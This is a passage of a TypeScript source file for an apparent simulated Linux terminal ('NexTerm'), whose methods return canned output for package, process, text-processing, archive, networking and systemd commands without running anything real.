gcc/stable,now 4:14-20240412-0ubuntu1 amd64 [installed]
nodejs/stable,now 20.15.0-1nodesource1 amd64 [installed]
htop/stable,now 3.3.0-4build1 amd64 [installed]
tree/stable,now 2.1.1-2ubuntu3 amd64 [installed]`
    }
    if (sub === 'search') {
      const term = args[1] || ''
      if (!term) return 'apt search: missing search term'
      const pkgDb = ['htop', 'tree', 'ncdu', 'neofetch', 'git', 'vim', 'curl', 'wget', 'nmap', 'tcpdump', 'netcat', 'tmux', 'screen', 'docker', 'python3', 'gcc', 'make', 'cmake', 'nginx', 'mysql', 'redis', 'postgresql']
      const matches = pkgDb.filter(p => p.includes(term.toLowerCase()))
      if (matches.length === 0) return `Sorting... Done\nFull Text Search... Done\nNo packages found matching "${term}"`
      return `Sorting... Done\nFull Text Search... Done\n${matches.map(p => `${p}/stable 1.0.0 amd64\n  ${p} - NexTerm Linux package`).join('\n')}`
    }
    if (sub === 'show') {
      const pkg = args[1]
      if (!pkg) return 'apt show: missing package name'
      return `Package: ${pkg}
Version: 1.0.0
Priority: optional
Section: utils
Maintainer: NexTerm Team <dev@nexterm.io>
Installed-Size: 1024 kB
Depends: libc6 (>= 2.39)
Homepage: https://nexterm.io
Description: ${pkg} - NexTerm Linux package`
    }
    if (sub === 'autoremove') {
      return `Reading package lists... Done
Building dependency tree... Done
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.`
    }
    return `E: Invalid operation ${sub}`
  }

  private cmdDpkg(args: string[]): string {
    if (args.length === 0 || args[0] === '-l' || args[0] === '--list') {
      return `Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name           Version      Architecture Description
+++-==============-============-============-=================================
ii  bash           5.2.21-2ubun amd64        GNU Bourne Again SHell
ii  coreutils      9.4-3ubuntu6 amd64        GNU core utilities
ii  vim            2:9.1.0016-1 amd64        Vi IMproved - enhanced vi editor
ii  nginx          1.24.0-2ubun amd64        high performance web server
ii  openssh-server 1:9.6p1-3ubu amd64        secure shell server
ii  curl           8.5.0-2ubunt amd64        command line URL transfer tool
ii  git            1:2.43.0-1ub amd64        fast version control system
ii  python3        3.12.3-0ubun amd64        interactive high-level language
ii  gcc            4:14-2024041 amd64        GNU C compiler
ii  htop           3.3.0-4build amd64        interactive process viewer`
    }
    return `dpkg: unknown option ${args[0]}`
  }

  private cmdSudo(args: string[]): string {
    if (this.state.uid !== 0 && this.state.username !== 'root') {
      return `[sudo] password for ${this.state.username}: 
Sorry, try again.
[sudo] password for ${this.state.username}: 
${this.state.username} is not in the sudoers file.  This incident will be reported.`
    }
    if (args.length === 0) return 'sudo: missing operand'
    return this.executeSingle(args.join(' '), '')
  }

  private cmdSu(args: string[]): string {
    const target = args.length > 0 ? args[0] : 'root'
    if (target === 'root' || target === '-') {
      this.state.username = 'root'
      this.state.uid = 0
      this.state.gid = 0
      this.state.cwd = '/root'
      this.state.env.HOME = '/root'
      this.state.env.USER = 'root'
      this.state.env.PWD = '/root'
      if (!this.state.vfs.children.has('root')) {
        const rootHome = createDir('root', 0o700)
        rootHome.owner = 'root'
        rootHome.group = 'root'
        this.state.vfs.children.set('root', rootHome)
      }
      return ''
    }
    return `su: user ${target} does not exist`
  }

  private cmdPasswd(_args: string[]): string {
    return `Changing password for ${this.state.username}.
Current password: 
New password: 
Retype new password: 
passwd: password updated successfully`
  }

  private cmdUseradd(args: string[]): string {
    if (args.length === 0) return 'useradd: missing operand'
    const name = args[0]
    return `useradd: user '${name}' created successfully
Adding new group '${name}' (1001)
Adding new user '${name}' (1001) with group '${name}'
Creating home directory '/home/${name}'`
  }

  private cmdGroups(args: string[]): string {
    const user = args.length > 0 ? args[0] : this.state.username
    return `${user} : ${user} adm cdrom sudo dip plugdev`
  }

  private cmdKill(args: string[]): string {
    if (args.length === 0) return 'kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ...'
    const signal9 = args.includes('-9') || args.includes('-SIGKILL')
    const pidArg = args.filter(a => !a.startsWith('-'))[0]
    if (!pidArg) return 'kill: missing pid argument'
    const pid = parseInt(pidArg)
    if (isNaN(pid)) return `kill: failed to parse argument: '${pidArg}'`
    const idx = this.state.processes.findIndex(p => p.pid === pid)
    if (idx === -1) return `bash: kill: (${pid}) - No such process`
    if (pid === 1) return `bash: kill: (1) - Operation not permitted`
    this.state.processes.splice(idx, 1)
    return signal9 ? `[1]  + ${pid} killed     ` : `[1]  + ${pid} terminated  `
  }

  private cmdKillall(args: string[]): string {
    if (args.length === 0) return 'killall: missing operand'
    const name = args[0]
    let count = 0
    this.state.processes = this.state.processes.filter(p => {
      if (p.name === name && p.pid !== 1) { count++; return false }
      return true
    })
    return count > 0 ? `killall: ${name}: ${count} process(es) terminated` : `killall: ${name}: no process found`
  }

  private cmdBg(_args: string[]): string {
    if (this.state.jobs.length === 0) return 'bg: no job control'
    const job = this.state.jobs[this.state.jobs.length - 1]
    job.status = 'Running'
    return `[${job.id}] ${job.cmd} &`
  }

  private cmdFg(_args: string[]): string {
    if (this.state.jobs.length === 0) return 'fg: no job control'
    const job = this.state.jobs[this.state.jobs.length - 1]
    job.status = 'Running'
    return `[${job.id}] ${job.cmd}`
  }

  private cmdJobs(_args: string[]): string {
    if (this.state.jobs.length === 0) return ''
    return this.state.jobs.map(j => `[${j.id}] ${j.status === 'Running' ? '+' : '-'}  ${j.status.padEnd(8)} ${j.cmd}`).join('\n')
  }

  private cmdNice(args: string[]): string {
    if (args.length === 0) return '0'
    return `nice: running '${args.join(' ')}' with priority 10`
  }

  private cmdRenice(args: string[]): string {
    if (args.length < 2) return 'renice: usage: renice priority [-p pid] [-g pgrp] [-u user]'
    return `renice: priority set to ${args[0]}`
  }

  private cmdNohup(_args: string[]): string {
    return `nohup: ignoring input and appending output to 'nohup.out'`
  }

  private cmdSed(args: string[], pipeInput: string): string {
    if (args.length === 0) return 'sed: missing script'
    const script = args[0]
    const fileArg = args.length > 1 ? args[1] : null
    let input = pipeInput
    if (!input && fileArg) {
      const content = this.readFile(fileArg)
      if (content === null) return `sed: can't read ${fileArg}: No such file or directory`
      input = content
    }
    if (!input) return 'sed: no input'

    const lines = input.split('\n')
    const results: string[] = []

    const sMatch = script.match(/^s\/(.+?)\/(.*?)\/(g?)$/)
    if (sMatch) {
      const [, pattern, replacement, flags] = sMatch
      try {
        const regex = new RegExp(pattern, flags.includes('g') ? 'g' : '')
        for (const line of lines) {
          results.push(line.replace(regex, replacement))
        }
      } catch {
        return `sed: invalid regex: ${pattern}`
      }
      return results.join('\n')
    }

    const dMatch = script.match(/^(\d+)?,?(\d+)?d$/)
    if (dMatch) {
      const start = dMatch[1] ? parseInt(dMatch[1]) : 1
      const end = dMatch[2] ? parseInt(dMatch[2]) : start
      for (let i = 0; i < lines.length; i++) {
        if (i + 1 < start || i + 1 > end) results.push(lines[i])
      }
      return results.join('\n')
    }

    const pMatch = script.match(/^(\d+)?,?(\d+)?p$/)
    if (pMatch) {
      const start = pMatch[1] ? parseInt(pMatch[1]) : 1
      const end = pMatch[2] ? parseInt(pMatch[2]) : start
      for (let i = 0; i < lines.length; i++) {
        if (i + 1 >= start && i + 1 <= end) results.push(lines[i])
      }
      return results.join('\n')
    }

    return `sed: unknown command: ${script}`
  }

  private cmdSort(args: string[], pipeInput: string): string {
    const reverse = args.includes('-r')
    const numeric = args.includes('-n')
    const fileArg = args.filter(a => !a.startsWith('-'))[0]
    let input = pipeInput
    if (!input && fileArg) {
      const content = this.readFile(fileArg)
      if (content === null) return `sort: cannot read: ${fileArg}: No such file or directory`
      input = content
    }
    if (!input) return ''

    let lines = input.split('\n').filter(l => l)
    if (numeric) {
      lines.sort((a, b) => {
        const na = parseFloat(a)
        const nb = parseFloat(b)
        if (isNaN(na) || isNaN(nb)) return a.localeCompare(b)
        return na - nb
      })
    } else {
      lines.sort((a, b) => a.localeCompare(b))
    }
    if (reverse) lines.reverse()
    return lines.join('\n')
  }

  private cmdUniq(args: string[], pipeInput: string): string {
    const count = args.includes('-c')
    const fileArg = args.filter(a => !a.startsWith('-'))[0]
    let input = pipeInput
    if (!input && fileArg) {
      const content = this.readFile(fileArg)
      if (content === null) return `uniq: cannot read: ${fileArg}: No such file or directory`
      input = content
    }
    if (!input) return ''

    const lines = input.split('\n').filter(l => l)
    const results: string[] = []
    let i = 0
    while (i < lines.length) {
      let j = i + 1
      while (j < lines.length && lines[j] === lines[i]) j++
      const cnt = j - i
      results.push(count ? `${String(cnt).padStart(7)} ${lines[i]}` : lines[i])
      i = j
    }
    return results.join('\n')
  }

  private cmdCut(args: string[], pipeInput: string): string {
    const delimIdx = args.indexOf('-d')
    const fieldIdx = args.indexOf('-f')
    let delimiter = '\t'
    let fields: number[] = [1]
    if (delimIdx >= 0 && delimIdx + 1 < args.length) delimiter = args[delimIdx + 1]
    if (fieldIdx >= 0 && fieldIdx + 1 < args.length) {
      fields = args[fieldIdx + 1].split(',').map(f => parseInt(f))
    }
    const fileArg = args.filter(a => !a.startsWith('-') && a !== delimiter && !a.includes(',')).find(a => !args[args.indexOf('-d') + 1]?.includes(a) && !args[args.indexOf('-f') + 1]?.includes(a))
    let input = pipeInput
    if (!input && fileArg) {
      const content = this.readFile(fileArg)
      if (content === null) return `cut: cannot read: ${fileArg}: No such file or directory`
      input = content
    }
    if (!input) return ''

    return input.split('\n').filter(l => l).map(line => {
      const parts = line.split(delimiter)
      return fields.map(f => parts[f - 1] || '').join(delimiter)
    }).join('\n')
  }

  private cmdDiff(args: string[]): string {
    if (args.length < 2) return 'diff: missing operand'
    const f1 = this.readFile(args[0])
    const f2 = this.readFile(args[1])
    if (f1 === null) return `diff: ${args[0]}: No such file or directory`
    if (f2 === null) return `diff: ${args[1]}: No such file or directory`

    const lines1 = f1.split('\n')
    const lines2 = f2.split('\n')
    const results: string[] = []
    const maxLen = Math.max(lines1.length, lines2.length)

    for (let i = 0; i < maxLen; i++) {
      const l1 = lines1[i] || ''
      const l2 = lines2[i] || ''
      if (l1 !== l2) {
        if (l1 && !l2) results.push(`${i + 1}d${i}`)
        else if (!l1 && l2) results.push(`${i}a${i + 1}`)
        else results.push(`${i + 1}c${i + 1}`)
        if (l1) results.push(`< ${l1}`)
        if (l2) results.push(`> ${l2}`)
      }
    }
    return results.length === 0 ? '' : results.join('\n')
  }

  private cmdTr(args: string[], pipeInput: string): string {
    if (args.length < 2) return 'tr: missing operand'
    const set1 = args[0]
    const set2 = args[1]
    if (!pipeInput) return ''

    const map: Record<string, string> = {}
    for (let i = 0; i < Math.min(set1.length, set2.length); i++) {
      map[set1[i]] = set2[i]
    }
    return pipeInput.split('').map(c => map[c] || c).join('')
  }

  private cmdAwk(args: string[], pipeInput: string): string {
    if (args.length === 0) return 'awk: missing script'
    const script = args[0]
    const fileArg = args.length > 1 ? args[args.length - 1] : null
    let input = pipeInput
    if (!input && fileArg && !fileArg.startsWith('{')) {
      const content = this.readFile(fileArg)
      if (content === null) return `awk: cannot read: ${fileArg}: No such file or directory`
      input = content
    }
    if (!input) return ''

    const lines = input.split('\n').filter(l => l)

    if (script === '{print $1}') {
      return lines.map(l => l.split(/\s+/)[0] || '').join('\n')
    }
    if (script === '{print $2}') {
      return lines.map(l => l.split(/\s+/)[1] || '').join('\n')
    }
    if (script === '{print $NF}') {
      return lines.map(l => {
        const parts = l.split(/\s+/).filter(Boolean)
        return parts[parts.length - 1] || ''
      }).join('\n')
    }
    if (script === '{print $0}') {
      return lines.join('\n')
    }
    if (script.startsWith('{print $')) {
      const n = parseInt(script.replace('{print $', '').replace('}', ''))
      if (!isNaN(n)) {
        return lines.map(l => l.split(/\s+/)[n - 1] || '').join('\n')
      }
    }
    return `awk: unsupported script: ${script} (supports {print $1}, {print $2}, {print $NF}, {print $0})`
  }

  private cmdTee(args: string[], pipeInput: string): string {
    if (args.length === 0) return 'tee: missing operand'
    const fileArg = args[0]
    if (pipeInput) {
      this.writeFile(fileArg, pipeInput)
    }
    return pipeInput || ''
  }

  private cmdXargs(args: string[], pipeInput: string): string {
    if (!pipeInput) return ''
    const cmd = args.length > 0 ? args[0] : 'echo'
    const lines = pipeInput.split('\n').filter(l => l)
    const results: string[] = []
    for (const line of lines) {
      const result = this.executeSingle(`${cmd} ${line}`, '')
      if (result) results.push(result)
    }
    return results.join('\n')
  }

  private cmdTar(args: string[]): string {
    if (args.length === 0) return 'tar: missing operand\nTry \'tar --help\' for more information.'
    const createFlag = args.includes('-czf') || args.includes('-cf')
    const extractFlag = args.includes('-xzf') || args.includes('-xf')
    const listFlag = args.includes('-tzf') || args.includes('-tf')

    if (listFlag) {
      const archiveIdx = args.findIndex(a => a.endsWith('.tar.gz') || a.endsWith('.tar'))
      if (archiveIdx < 0) return 'tar: missing archive name'
      const archive = args[archiveIdx]
      return `drwxr-xr-x user/user       0 2024-01-01 00:00 ${archive.replace('.tar.gz', '').replace('.tar', '')}/
-rw-r--r-- user/user    1024 2024-01-01 00:00 README.md
-rw-r--r-- user/user     512 2024-01-01 00:00 config.json
-rw-r--r-- user/user    2048 2024-01-01 00:00 main.py`
    }

    if (extractFlag) {
      const archiveIdx = args.findIndex(a => a.endsWith('.tar.gz') || a.endsWith('.tar'))
      if (archiveIdx < 0) return 'tar: missing archive name'
      return `tar: ${args[archiveIdx]}: extracted successfully`
    }

    if (createFlag) {
      const archiveIdx = args.findIndex(a => a.endsWith('.tar.gz') || a.endsWith('.tar'))
      if (archiveIdx < 0) return 'tar: missing archive name'
      return `tar: ${args[archiveIdx]}: created successfully`
    }

    return 'tar: invalid option'
  }

  private cmdGzip(args: string[]): string {
    if (args.length === 0) return 'gzip: compressed data not written to a terminal'
    const target = args[0]
    const node = this.getNode(target)
    if (!node) return `gzip: ${target}: No such file or directory`
    if (node.type === 'dir') return `gzip: ${target} is a directory -- ignored`
    const content = node.content ?? ''
    node.name = target + '.gz'
    node.content = `[gzip compressed: ${content.length} bytes]`
    return `gzip: ${target}: ${((content.length * 0.4) / content.length * 100).toFixed(1)}% -- replaced with ${target}.gz`
  }

  private cmdGunzip(args: string[]): string {
    if (args.length === 0) return 'gunzip: compressed data not written to a terminal'
    const target = args[0]
    if (!target.endsWith('.gz')) return `gunzip: ${target}: unknown suffix -- ignored`
    const node = this.getNode(target)
    if (!node) return `gunzip: ${target}: No such file or directory`
    node.name = target.replace('.gz', '')
    node.content = `[decompressed content]`
    return `gunzip: ${target}: decompressed to ${node.name}`
  }

  private cmdZip(args: string[]): string {
    if (args.length < 2) return 'zip: missing operand'
    const archive = args[0]
    const files = args.slice(1)
    return `  adding: ${files.join(' (stored 0%)\n  adding: ')} (stored 0%)
zip: ${archive}: created successfully`
  }

  private cmdUnzip(args: string[]): string {
    if (args.length === 0) return 'unzip: missing operand'
    const archive = args[0]
    return `Archive:  ${archive}
  inflating: README.md
  inflating: config.json
  inflating: main.py
unzip: ${archive}: extracted successfully`
  }

  private cmdIp(args: string[]): string {
    if (args.length === 0 || args[0] === 'addr' || args[0] === 'a') {
      return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:4e:5f:12 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.100/24 brd 192.168.1.255 scope global dynamic eth0
       valid_lft 86300sec preferred_lft 86300sec
    inet6 fe80::a00:27ff:fe4e:5f12/64 scope link
       valid_lft forever preferred_lft forever`
    }
    if (args[0] === 'route' || args[0] === 'r') {
      return `default via 192.168.1.1 dev eth0 proto dhcp src 192.168.1.100 metric 100
192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.100 metric 100
172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown`
    }
    return `ip: unknown command "${args[0]}"`
  }

  private cmdSs(args: string[]): string {
    const tcp = args.includes('-t') || args.includes('-tulnp')
    const udp = args.includes('-u') || args.includes('-tulnp')
    const listen = args.includes('-l') || args.includes('-tulnp')

    const results: string[] = ['Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:Port  Process']
    if (tcp) {
      results.push('tcp   LISTEN 0      128    0.0.0.0:22          0.0.0.0:*          users:(("sshd",pid=42,fd=3))')
      results.push('tcp   LISTEN 0      128    0.0.0.0:80          0.0.0.0:*          users:(("nginx",pid=100,fd=6))')
      if (!listen) {
        results.push('tcp   ESTAB  0      0      192.168.1.100:22   192.168.1.50:54321  users:(("sshd",pid=42,fd=4))')
        results.push('tcp   ESTAB  0      0      192.168.1.100:443  142.250.80.4:443    users:(("curl",pid=2560,fd=3))')
      }
    }
    if (udp) {
      results.push('udp   UNCONN 0      0      0.0.0.0:68          0.0.0.0:*          users:(("dhclient",pid=512,fd=6))')
      results.push('udp   UNCONN 0      0      127.0.0.1:53        0.0.0.0:*          users:(("systemd-resolve",pid=128,fd=13))')
    }
    return results.join('\n')
  }

  private cmdNetstat(args: string[]): string {
    const listen = args.includes('-l') || args.includes('-tulnp')

    const results: string[] = ['Active Internet connections (servers and established)']
    results.push('Proto Recv-Q Send-Q Local Address           Foreign Address         State')
    results.push('tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN')
    results.push('tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN')
    results.push('tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN')
    if (!listen) {
      results.push('tcp        0      0 192.168.1.100:22        192.168.1.50:54321      ESTABLISHED')
      results.push('tcp        0      0 192.168.1.100:443       142.250.80.4:443        ESTABLISHED')
    }
    results.push('udp        0      0 0.0.0.0:68              0.0.0.0:*')
    results.push('udp        0      0 127.0.0.1:53            0.0.0.0:*')
    results.push('Active UNIX domain sockets (servers and established)')
    results.push('Proto RefCnt Flags       Type       State         I-Node   Path')
    results.push('unix  2      [ ACC ]     STREAM     LISTENING     12345    /run/systemd/private')
    results.push('unix  3      [ ]         DGRAM                    12346    /run/systemd/notify')
    return results.join('\n')
  }

  private cmdNslookup(args: string[]): string {
    if (args.length === 0) return 'nslookup: missing hostname'
    const host = args[0]
    return `Server:		8.8.8.8
Address:	8.8.8.8#53

Non-authoritative answer:
Name:	${host}
Address: 142.250.80.4
Name:	${host}
Address: 2404:6800:4005:811::2004`
  }

  private cmdDig(args: string[]): string {
    if (args.length === 0) return 'dig: missing hostname'
    const host = args[0]
    return `
; <<>> DiG 9.18.28-0ubuntu0.24.04.1 <<>> ${host}
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12345
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; QUESTION SECTION:
;${host}.			IN	A

;; ANSWER SECTION:
${host}.		300	IN	A	142.250.80.4

;; Query time: 15 msec
;; SERVER: 8.8.8.8#53(8.8.8.8) (UDP)
;; WHEN: ${new Date().toISOString().split('T')[0]} 00:00:00 UTC
;; MSG SIZE  rcvd: 55`
  }

  private cmdTraceroute(args: string[]): string {
    if (args.length === 0) return 'traceroute: missing hostname'
    const host = args[0]
    return `traceroute to ${host} (142.250.80.4), 30 hops max, 60 byte packets
 1  192.168.1.1 (192.168.1.1)  1.123 ms  1.234 ms  1.345 ms
 2  10.0.0.1 (10.0.0.1)  5.678 ms  5.789 ms  5.890 ms
 3  203.0.113.1 (203.0.113.1)  10.234 ms  10.345 ms  10.456 ms
 4  142.250.80.4 (142.250.80.4)  15.789 ms  15.890 ms  15.901 ms`
  }

  private cmdWget(args: string[]): string {
    if (args.length === 0) return 'wget: missing URL'
    const url = args[0]
    const filename = url.split('/').pop() || 'index.html'
    return `--${new Date().toISOString().split('T')[0]} 00:00:00--  ${url}
Resolving ${url.split('/')[2] || 'server'}... 142.250.80.4
Connecting to ${url.split('/')[2] || 'server'}... connected.
HTTP request sent, awaiting response... 200 OK
Length: ${Math.floor(Math.random() * 5000 + 500)} [text/html]
Saving to: '${filename}'

${filename}  100%[===================>]  ${Math.floor(Math.random() * 5000 + 500)}  --.-KB/s    in 0.1s

${new Date().toISOString().split('T')[0]} 00:00:00 (50.0 MB/s) - '${filename}' saved`
  }

  private cmdNc(args: string[]): string {
    if (args.length === 0) return 'nc: missing operand'
    if (args.includes('-l')) {
      const port = args.find(a => /^\d+$/.test(a))
      return `Listening on 0.0.0.0 ${port || '4444'}`
    }
    const host = args[0]
    const port = args[1] || '80'
    return `Connection to ${host} ${port} port [tcp/*] succeeded!
HTTP/1.1 200 OK
Server: nginx/1.24.0
Content-Type: text/html

<html><body><h1>Connected!</h1></body></html>`
  }

  private cmdLscpu(): string {
    return `Architecture:            x86_64
  CPU op-mode(s):        32-bit, 64-bit
  Address sizes:         48 bits physical, 48 bits virtual
  Byte Order:            Little Endian
CPU(s):                  16
  On-line CPU(s) list:   0-15
Vendor ID:               AuthenticAMD
  Model name:            AMD Ryzen 7 5800X 8-Core Processor
    CPU family:          25
    Model:               33
    Thread(s) per core:  2
    Core(s) per socket:  8
    Socket(s):           1
    Stepping:            2
    CPU max MHz:         4800.0000
    CPU min MHz:         2200.0000
    BogoMIPS:            7600.00
Caches (sum of all):
  L1d:                   256 KiB (8 instances)
  L1i:                   256 KiB (8 instances)
  L2:                    4 MiB (8 instances)
  L3:                    32 MiB (1 instance)
NUMA:
  NUMA node(s):          1
  NUMA node0 CPU(s):     0-15
Vulnerabilities:
  Gather data sampling:  Not affected
  Itlb multihit:         Not affected
  L1tf:                  Not affected
  Mds:                   Not affected
  Meltdown:              Not affected
  Spec store bypass:     Mitigation; Speculative Store Bypass disabled
  Spectre v1:            Mitigation; usercopy/swapgs barriers
  Spectre v2:            Mitigation; Retpolines, IBPB conditional
  Srbds:                 Not affected
  Tsx async abort:       Not affected`
  }

  private cmdLsblk(): string {
    return `NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
sda      8:0    0    50G  0 disk
├─sda1   8:1    0    48G  0 part /
├─sda2   8:2    0     1K  0 part
└─sda5   8:5    0     2G  0 part [SWAP]
sdb      8:16   0   100G  0 disk
└─sdb1   8:17   0   100G  0 part /data
sr0     11:0    1  1024M  0 rom`
  }

  private cmdLspci(): string {
    return `00:00.0 Host bridge: Advanced Micro Devices, Inc. [AMD] Renoir/Cezanne Root Complex
00:01.0 VGA compatible controller: NVIDIA Corporation GA106 [GeForce RTX 3060] (rev a1)
00:02.0 PCI bridge: Advanced Micro Devices, Inc. [AMD] Renoir/Cezanne PCIe GPP Bridge
00:03.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 02)
00:04.0 SATA controller: Advanced Micro Devices, Inc. [AMD] FCH SATA Controller [AHCI mode]
00:05.0 USB controller: Advanced Micro Devices, Inc. [AMD] Renoir/Cezanne USB 3.1
00:06.0 Audio device: Advanced Micro Devices, Inc. [AMD] Family 17h HD Audio Controller
00:07.0 Non-Volatile memory controller: Samsung Electronics Co Ltd NVMe SSD Controller PM9A1`
  }

  private cmdLsusb(): string {
    return `Bus 004 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub
Bus 003 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
Bus 002 Device 002: ID 0bda:0411 Realtek Semiconductor Corp. 4-Port USB 3.0 Hub
Bus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub
Bus 001 Device 003: ID 046d:c52b Logitech, Inc. Unifying Receiver
Bus 001 Device 002: ID 0bda:5411 Realtek Semiconductor Corp. 4-Port USB 2.0 Hub
Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub`
  }

  private cmdSystemctl(args: string[]): string {
    if (args.length === 0) return 'systemctl: missing command'
    if (args[0] === 'status') {
      const service = args[1] || ''
      if (!service) {
        return `● nexterm-vm
    State: running
    Units: 120 loaded (listed: /usr/lib/systemd/system)
    Jobs: 0 queued
  Failed: 0 units`
      }
      return `● ${service}.service - ${service} service
     Loaded: loaded (/etc/systemd/system/${service}.service; enabled)
     Active: active (running) since ${new Date().toISOString().split('T')[0]} 00:00:00 UTC; 1h ago
   Main PID: ${Math.floor(Math.random() * 5000 + 100)}
      Tasks: ${Math.floor(Math.random() * 5 + 1)}
     Memory: ${Math.floor(Math.random() * 100 + 10)}.0M
        CPU: 100ms
     CGroup: /system.slice/${service}.service`
    }
    if (args[0] === 'list-units') {
      return `UNIT                     LOAD   ACTIVE SUB     DESCRIPTION
sshd.service             loaded active running OpenSSH Daemon
nginx.service            loaded active running nginx web server
cron.service             loaded active running Regular background processing
dbus.service             loaded active running D-Bus System Message Bus
systemd-journald.service loaded active running Journal Service
systemd-logind.service   loaded active running User Login Management`
    }
    if (args[0] === 'enable' || args[0] === 'disable') {
      const svc = args[1] || ''
      if (!svc) return `systemctl: missing service name for ${args[0]}`
      return `Created symlink /etc/systemd/system/multi-user.target.wants/${svc}.service → /etc/systemd/system/${svc}.service.`
    }
    if (args[0] === 'start' || args[0] === 'stop' || args[0] === 'restart' || args[0] === 'reload') {
      const svc = args[1] || ''
      if (!svc) return `systemctl: missing service name for ${args[0]}`
      return `[  OK  ] ${args[0]}ed ${svc}.service.`
    }
    return `systemctl: unknown command "${args[0]}"`
  }

  private cmdService(args: string[]): string {
    if (args.length < 2) return 'service: missing arguments\nUsage: service <service> <action>'
    const svc = args[0]
    const action = args[1]
    if (['start', 'stop', 'restart', 'reload', 'status'].includes(action)) {
      return `[ ok ] ${action}ing ${svc} (via systemctl): ${svc}.service.`
    }
    return `service: unknown action "${action}"`
  }

  private cmdJournalctl(args: string[]): string {
    const n = args.includes('-n') ? parseInt(args[args.indexOf('-n') + 1] || '10') : 10
    const lines = [
      '-- Logs begin at Mon 2024-01-01 00:00:00 UTC, end at ' + new Date().toISOString().split('T')[0] + ' 00:00:00 UTC. --',
      'Jan 01 00:00:01 nexterm-vm kernel: Linux version 6.1.0-nexterm (nexterm@buildhost)',
      'Jan 01 00:00:02 nexterm-vm systemd[1]: Starting systemd-journald.service...',
      'Jan 01 00:00:03 nexterm-vm systemd[1]: Started systemd-journald.service.',
      'Jan 01 00:00:05 nexterm-vm sshd[42]: Server listening on 0.0.0.0 port 22.',
      'Jan 01 00:00:10 nexterm-vm systemd[1]: Starting nginx.service...',
      'Jan 01 00:00:11 nexterm-vm systemd[1]: Started nginx.service.',
      'Jan 01 00:01:00 nexterm-vm CRON[88]: (root) CMD (apt update)',
      'Jan 01 00:05:00 nexterm-vm systemd[1]: Starting Daily apt upgrade...',
      'Jan 01 00:05:05 nexterm-vm systemd[1]: Started Daily apt upgrade.',
    ]
    return lines.slice(0, n + 1).join('\n')
  }

  private cmdLocate(args: string[]): string {
    if (args.length === 0) return 'locate: missing pattern'
    const pattern = args[0].toLowerCase()
    const db = [
      '/etc/apt/sources.list', '/etc/hostname', '/etc/hosts', '/etc/passwd', '/etc/group',
      '/etc/resolv.conf', '/etc/fstab', '/etc/shells', '/etc/sudoers', '/etc/os-release',
      '/etc/systemd/system/sshd.service', '/etc/systemd/system/nginx.service',
      '/etc/network/interfaces', '/etc/security/limits.conf',
      '/home/user/.bashrc', '/home/user/Documents/cheatsheet.txt',
      '/home/user/projects/hello.py', '/home/user/projects/README.md',
      '/var/log/syslog', '/var/lib/dpkg/status',
      '/proc/cpuinfo', '/proc/meminfo', '/proc/version',
      '/boot/config-6.1.0-nexterm',
    ]
    const results = db.filter(p => p.toLowerCase().includes(pattern))
    return results.length === 0 ? `locate: no results for "${pattern}"` : results.join('\n')
  }

  private cmdUpdatedb(): string {
    return `updatedb: building file database... done (found ${120 + Object.keys(this.state).length} files)`
  }

  private cmdWhereis(args: string[]): string {
    if (args.length === 0) return 'whereis: missing operand'
    const cmd = args[0]
    const locations: Record<string, string> = {
      bash: '/usr/bin/bash /etc/bash.bashrc /usr/share/man/man1/bash.1.gz',
      ls: '/usr/bin/ls /usr/share/man/man1/ls.1.gz',
      vim: '/usr/bin/vim /usr/share/vim /usr/share/man/man1/vim.1.gz',
      python: '/usr/bin/python3 /usr/bin/python3.12 /usr/share/man/man1/python3.1.gz',
      ssh: '/usr/bin/ssh /etc/ssh /usr/share/man/man1/ssh.1.gz',
    }
    return locations[cmd] || `${cmd}:`
  }

  private cmdFile(args: string[]): string {
    if (args.length === 0) return 'file: missing operand'
    const target = args[0]
    const node = this.getNode(target)
    if (!node) return `file: cannot open '${target}' (No such file or directory)`
    if (node.type === 'dir') return `${target}: directory`
    const name = node.name.toLowerCase()
    const content = node.content || ''
    if (name.endsWith('.py') || content.includes('#!/usr/bin/env python')) return `${target}: Python script, ASCII text executable`
    if (name.endsWith('.sh') || content.includes('#!/bin/bash')) return `${target}: Bourne-Again shell script, ASCII text executable`
    if (name.endsWith('.md')) return `${target}: Markdown document, ASCII text`
    if (name.endsWith('.txt')) return `${target}: ASCII text`
    if (name.endsWith('.json')) return `${target}: JSON text data`
    if (name.endsWith('.conf') || name.endsWith('.cfg')) return `${target}: ASCII text`
    if (name.endsWith('.gz')) return `${target}: gzip compressed data`
    if (name.endsWith('.tar')) return `${target}: POSIX tar archive`
    if (name.endsWith('.zip')) return `${target}: Zip archive data`
    if (name.endsWith('.html')) return `${target}: HTML document, ASCII text`
    if (name.endsWith('.css')) return `${target}: CSS style sheet, ASCII text`
    return `${target}: ASCII text`
  }

  private cmdStat(args: string[]): string {
    if (args.length === 0) return 'stat: missing operand'
    const target = args[0]
    const node = this.getNode(target)
